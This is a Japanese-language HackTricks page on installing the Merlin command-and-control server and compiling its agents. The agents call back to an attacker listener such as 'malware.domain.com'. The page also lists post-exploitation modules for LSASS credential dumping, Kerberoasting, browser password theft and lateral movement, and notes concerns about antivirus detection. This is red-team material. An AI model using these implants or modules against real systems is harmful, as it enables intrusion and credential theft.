<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい場合**、または**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>


# インストール

## GOのインストール
```
#Download GO package from: https://golang.org/dl/
#Decompress the packe using:
tar -C /usr/local -xzf go$VERSION.$OS-$ARCH.tar.gz

#Change /etc/profile
Add ":/usr/local/go/bin" to PATH
Add "export GOPATH=$HOME/go"
Add "export GOBIN=$GOPATH/bin"

source /etc/profile
```
## Merlinのインストール
```
go get https://github.com/Ne0nd0g/merlin/tree/dev #It is recommended to use the developer branch
cd $GOPATH/src/github.com/Ne0nd0g/merlin/
```
# Merlinサーバーの起動
```
go run cmd/merlinserver/main.go -i
```
# Merlin エージェント

[事前にコンパイルされたエージェントをダウンロードする](https://github.com/Ne0nd0g/merlin/releases)ことができます。

## エージェントのコンパイル

メインフォルダ _$GOPATH/src/github.com/Ne0nd0g/merlin/_ に移動してください。
```
#User URL param to set the listener URL
make #Server and Agents of all
make windows #Server and Agents for Windows
make windows-agent URL=https://malware.domain.com:443/ #Agent for windows (arm, dll, linux, darwin, javascript, mips)
```
## **エージェントの手動コンパイル**
```
GOOS=windows GOARCH=amd64 go build -ldflags "-X main.url=https://10.2.0.5:443" -o agent.exe main.g
```
# モジュール

**悪いニュースは、Merlinによって使用されるすべてのモジュールがソース（Github）からダウンロードされ、使用する前にディスクに保存されることです。よく知られているモジュールを使用する際は、Windows Defenderに捕まらないように注意してください！**


**SafetyKatz** --> Modified Mimikatz。LSASSをファイルにダンプし、そのファイルに対して:sekurlsa::logonpasswordsを実行します\
**SharpDump** --> 指定されたプロセスID（デフォルトではLSASS）のminidump（最終ファイルの拡張子は.gzと言われていますが、実際には.binですが、gzファイルです）\
**SharpRoast** --> Kerberoast（動作しません）\
**SeatBelt** --> CSのローカルセキュリティテスト（動作しません） https://github.com/GhostPack/Seatbelt/blob/master/Seatbelt/Program.cs\
**Compiler-CSharp** --> csc.exe /unsafeを使用してコンパイル\
**Sharp-Up** --> powerupのC#での全チェック（動作します）\
**Inveigh** --> PowerShellADIDNS/LLMNR/mDNS/NBNSスプーファーおよびマンインザミドルツール（動作しません、以下をロードする必要があります：https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1）\
**Invoke-InternalMonologue** --> 利用可能なすべてのユーザーを偽装し、各ユーザーに対してチャレンジレスポンスを取得します（各ユーザーのNTLMハッシュ）（不正なURL）\
**Invoke-PowerThIEf** --> IExplorerからフォームを盗むか、JSを実行させるか、そのプロセスにDLLを注入する（動作しません）（PSも動作しないようです） https://github.com/nettitude/Invoke-PowerThIEf/blob/master/Invoke-PowerThIEf.ps1\
**LaZagneForensic** --> ブラウザのパスワードを取得（動作しますが、出力ディレクトリを印刷しません）\
**dumpCredStore** --> Win32 Credential Manager API（https://github.com/zetlen/clortho/blob/master/CredMan.ps1） https://www.digitalcitizen.life/credential-manager-where-windows-stores-passwords-other-login-details\
**Get-InjectedThread** --> 実行中のプロセスでのクラシックインジェクションを検出（クラシックインジェクション（OpenProcess、VirtualAllocEx、WriteProcessMemory、CreateRemoteThread））（動作しません）\
**Get-OSTokenInformation** --> 実行中のプロセスとスレッドのトークン情報を取得（ユーザー、グループ、権限、所有者... https://docs.microsoft.com/es-es/windows/desktop/api/winnt/ne-winnt-\_token_information_class）\
**Invoke-DCOM** --> DCOMを介してコマンドを実行します（他のコンピューターで）（http://www.enigma0x3.net.）（https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/）\
**Invoke-DCOMPowerPointPivot** --> PowerPoint COMオブジェクトを悪用して他のPCでコマンドを実行（ADDin）\
**Invoke-ExcelMacroPivot** --> ExcelのDCOMを悪用して他のPCでコマンドを実行\
**Find-ComputersWithRemoteAccessPolicies** --> （動作しません）（https://labs.mwrinfosecurity.com/blog/enumerating-remote-access-policies-through-gpo/）\
**Grouper** --> グループポリシーの最も興味深い部分をすべてダンプし、それらを探って悪用可能なものを見つけます。（非推奨）Grouper2を見てみてください、とても良さそうです\
**Invoke-WMILM** --> 後方移動のためのWMI\
**Get-GPPPassword** --> groups.xml、scheduledtasks.xml、services.xml、datasources.xmlを探し、プレーンテキストパスワードを返します（ドメイン内）\
**Invoke-Mimikatz** --> mimikatzを使用（デフォルトのクレデンシャルダンプ）\
**PowerUp** --> https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc\
**Find-BadPrivilege** --> コンピューターのユーザーの権限をチェック\
**Find-PotentiallyCrackableAccounts** --> SPNに関連付けられたユーザーアカウントに関する情報を取得（Kerberoasting）\
**psgetsystem** --> getsystem

**永続性モジュールはチェックしていません**

# まとめ

このツールの感触とポテンシャルがとても気に入りました。\
ツールがサーバーからモジュールをダウンロードし始め、スクリプトをダウンロードする際に何らかの回避策を統合することを願っています。


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でゼロからヒーローまでAWSハッキングを学ぶ</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手してください
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見してください。私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)コレクションです。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加するか**、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**してください。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有してください。

</details>
